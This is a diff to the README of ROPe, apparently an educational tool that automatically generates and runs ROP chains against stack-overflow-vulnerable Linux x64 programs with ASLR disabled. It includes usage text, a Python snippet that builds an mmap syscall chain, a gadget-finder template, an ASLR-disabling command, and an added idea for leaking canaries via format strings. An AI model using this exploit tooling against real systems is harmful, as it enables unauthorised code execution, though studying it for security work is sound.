@@ -14,7 +14,7 @@ ROPe was developed on Kali Linux 2020.1 x64 and requires Python >= 3.6.
 ROPe has been designed for use on Linux x64 devices with ASLR disabled, and targets programs which take unchecked user input during runtime (not through a command line argument). This makes it suitable for attacking programs which utilize `read(2)`, `gets(3)`, and `scanf(3)`.
 
 ## Files
-```
+```shell
 .
 ├── Makefile
 ├── notvuln.c
@@ -59,7 +59,7 @@ Option 3 is the preferred way, offering the most consistent results while enabli
 Note also that ASLR should be disabled. This can be achieved by `echo 0 > /proc/sys/kernel/randomize_va_space` as root.
 
 ## Usage
-```
+```shell
 usage: ROPe.py [-h] [-v] [-t] [-x] [-d] [-p [P]] files [files ...]
 
 Automatically generate and execute a ROP chain suitable for executing a third party payload.
@@ -139,7 +139,7 @@ ROPe will attempt to generate a suitable ROP chain. By default, four are provide
 If desired, ROPe can be easily configured to generate other ROP chains. Simply add an appropriate build rule that knows the structure of the desired chain, then create and use any necessary gadget finders to fill in the blanks in the chain.
 
 As an example of payload construction, consider the following segment which generates the `mmap` invocation for chain 3:
-```Python
+```python
     payload  = p64(xor_rax_rax)         # rax = 0
     payload += p64(add_rax_1) * 9       # rax = 9
     payload += p64(pop_rdi)             # 1st arg
@@ -156,10 +156,10 @@ As an example of payload construction, consider the following segment which gene
     payload += p64(0x0)                 # r9 = 0
     payload += p64(syscall)             # invoke system call 9
 ```
-As shown above, the constant values were are attempting to place into registers are simply placed on the stack in the appropriate place. The variables `xor_rax_rax` or `pop_r10` are the addresses of gadgets suitable for performing those tasks, and are gotten beforehand via `find_xor_rax_rax_ret()` and `find_pop_r10_ret()`.
+As shown above, the constant values we are attempting to place into registers are simply placed on the stack in the appropriate place, such that they may be popped off into the correct registers. The variables `xor_rax_rax` or `pop_r10` are the addresses of gadgets suitable for performing those popping tasks, and are located beforehand via `find_xor_rax_rax_ret()` and `find_pop_r10_ret()`.
 
 If more gadget locators are required, they may be freely added and used, following the format:
-```Python
+```python
 def find_xor_rax_rax_ret():
     global gadget_map                           # Map of all (addr, gadget) pairs
     for g_addr in gadget_map:                   # For every address in the map
@@ -187,11 +187,13 @@ The following demonstration videos are provided for your consideration as proof 
 - [Ubuntu 18 x64](https://drive.google.com/open?id=1IHybLSQm7FpWms8cPQQETuXbincRpszx) (Image available [here](https://releases.ubuntu.com/18.04.4/ubuntu-18.04.4-desktop-amd64.iso))
 - [Ubuntu 20 x64](https://drive.google.com/open?id=158PW58v5_X7-vZmx07IpyrmoZyG3-wqO) (Image available [here](https://ubuntu.osuosl.org/releases/20.04/ubuntu-20.04-desktop-amd64.iso))
 
-Strangely, if I adjust the value determined to be the length of the padding necessary to cause the overflow by 1, ROPe also has varying degrees of success on Debian and Arch, as evidenced ![here](https://drive.google.com/file/d/1kdQddtpR6dbSIwMK7sPiEEtVcigpaICM/view?usp=sharing) 
+Strangely, if I adjust the value determined to be the length of the padding necessary to cause the overflow by 1, ROPe also has varying degrees of success on Debian and Arch, as evidenced below:
+
+![Arch PoC](https://i5.imageban.ru/out/2020/05/09/a362b20a42686a0e5edcae880edb91c7.png)
 
 ## Extending ROPe
 If ROPe were to be developed further, the following potential options could be considered:
-- Overcoming protections (ASLR, canaries)
+- Overcoming protections (ASLR, canaries): Needs a way to leak values, especially for overcoming canaries. If there were a reliable way to ensure that whatever input is fed into the target program would be `printf(3)`'d back, format string bugs could potentially be used to leak the values up the stack. However, this is not guaranteed and, as such, has been left out in favor of creating a more generic tool.
 - More/varied potential ROP chains: Currently ROPe focuses on 4 very linear chains, using very specific gadgets. If these specific gadgets are not able to located, the ROP chain generator may fail, even though a similar gadget which performs the same functionality may exist (eg, `inc rax; ret;` does not exist within the address space, but `add rax, 1; ret;` does)
 
 ## References
